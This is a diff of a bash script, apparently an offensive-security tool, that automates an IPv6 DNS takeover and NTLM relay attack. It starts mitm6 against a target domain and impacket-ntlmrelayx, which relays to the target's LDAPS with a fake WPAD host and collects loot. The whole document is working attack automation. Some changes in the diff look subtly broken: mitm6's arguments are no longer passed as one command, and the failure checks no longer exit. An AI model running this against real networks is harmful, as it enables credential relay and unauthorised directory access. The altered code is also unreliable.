@@ -151,7 +151,8 @@ cleanup() {
     tmux kill-session -t "$session_name" 2>/dev/null || true
   fi
 }
-trap cleanup EXIT
+
+trap cleanup EXIT INT TERM
 
 # Create a new tmux session
 tmux has-session -A -s "$session_name" 2>/dev/null && {
@@ -171,7 +172,7 @@ start_tmux_window() {
   local window_name="$2"
   local command="$3"
   
-  tmux new-window -t "${session}:" -n "$window_name" || {
+  tmux new-window -t "$session" -n "$window_name" || {
     echo "Failed to create window"
     exit 1
   }
@@ -182,32 +183,29 @@ start_tmux_window() {
 # Start mitm6 in tmux session
 echo -e "${CYAN}Starting mitm6 on interface $interface for domain $target_domain...${RESET}"
 start_tmux_window "$session_name" "mitm6" \
-"mitm6 -i \"$interface\" -d \"$target_domain\"" || {
+mitm6 -i "$interface" -d "$target_domain" || {
   echo -e "${RED}Failed to start mitm6.${RESET}"
   exit 1
 }
 
-sleep 2
-if ! pgrep -fa "mitm6 -i $interface -d $target_domain" >/dev/null; then
-  echo -e "${RED}mitm6 failed to start${RESET}"
-  exit 1
-fi
+for i in {1..5}; do
+  pgrep -fa "mitm6.*$target_domain" >/dev/null && break
+  sleep 1
+done
 
 # Start impacket-ntlmrelayx in tmux session
 echo -e "${CYAN}Starting impacket-ntlmrelayx...${RESET}"
-start_tmux_window "$session_name" "impacket-ntlmrelayx" "impacket-ntlmrelayx -6 -t ldaps://$target_ip -wh fakewpad.$target_domain -l $loot_dir" || {
+start_tmux_window "$session_name" "impacket-ntlmrelayx" \
+"impacket-ntlmrelayx -6 -t ldaps://$target_ip -wh fakewpad.$target_domain -l $loot_dir" || {
   echo -e "${RED}Failed to start impacket-ntlmrelayx.${RESET}"
   exit 1
 }
 
-sleep 2
-if ! pgrep -fa "impacket-ntlmrelayx.*ldaps://$target_ip" >/dev/null; then
-  echo -e "${RED}ntlmrelayx failed to start${RESET}"
-  exit 1
-fi
+for i in {1..5}; do
+  pgrep -fa "impacket-ntlmrelayx.*ldaps://$target_ip" >/dev/null && break
+  sleep 1
+done
 
-# Attach to the tmux session
-echo -e "${GREEN}Attaching to the tmux session '$session_name'...${RESET}"
 
 # Disable verbose logging
 if [ "$verbose" -eq 1 ]; then
@@ -215,7 +213,8 @@ if [ "$verbose" -eq 1 ]; then
   set +x
 fi
 
-trap - EXIT
+# Attach to the tmux session
+echo -e "${GREEN}Attaching to the tmux session '$session_name'...${RESET}"
 tmux attach-session -t "$session_name" || {
   echo -e "${RED}Failed to attach to session${RESET}"
   exit 1
